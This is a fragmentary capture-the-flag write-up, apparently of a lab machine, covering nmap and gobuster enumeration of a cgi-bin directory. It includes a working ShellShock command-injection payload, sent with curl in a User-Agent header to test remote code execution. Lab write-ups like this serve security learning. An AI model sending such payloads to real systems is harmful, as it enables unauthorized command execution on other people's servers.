...
gobuster dir -u http://10.129.191.193/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,pl,cgi

# 2. Confirm ShellShock RCE via User-Agent (test with whoami first)
curl -H "User-Agent: () { :; }; echo; /usr/bin/whoami" http://10.129.191.193/cgi-bin/user.sh
...
```bash
nmap -sV -sC -oN nmap/initial 10.129.191.193
```
...
```bash
gobuster dns -d 10.129.191.193 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
Result: nothing. DNS subdomain wordlist against a directory — completely wrong tool for the job.

**Attempt 2 (correct wordlist):**
```bash
gobuster dir -u http://10.129.191.193 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
...
```bash
gobuster dir -u http://10.129.191.193/cgi-bin/ \
...
Send a GET request to `http://10.129.191.193/cgi-bin/user.sh`, intercept in Burp, send to Repeater.
